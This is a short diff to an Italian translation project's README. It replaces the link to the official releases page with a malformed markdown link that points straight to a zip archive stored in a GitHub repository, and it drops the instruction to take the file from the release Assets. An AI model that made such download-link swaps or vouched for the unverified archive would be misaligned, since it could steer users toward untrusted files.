@@ -10,9 +10,9 @@
 
 ## ⬇️ Download
 
-**[Scarica l'ultima versione / Download the latest version](../../releases/latest)**
+**[Scarica l'ultima versione / Download the latest version]([../../releases/latest](https://github.com/jakejcoffin/TPtC-traduzione-italiana/blob/main/TPtC_Traduzione_ITA_v1.2.zip))**
 
-Scarica il file `TPtC_Traduzione_ITA_vX.X.zip` dalla sezione *Assets* della release.
+Scarica il file `TPtC_Traduzione_ITA_v1.2.zip`
 
 ## Cosa traduce
 
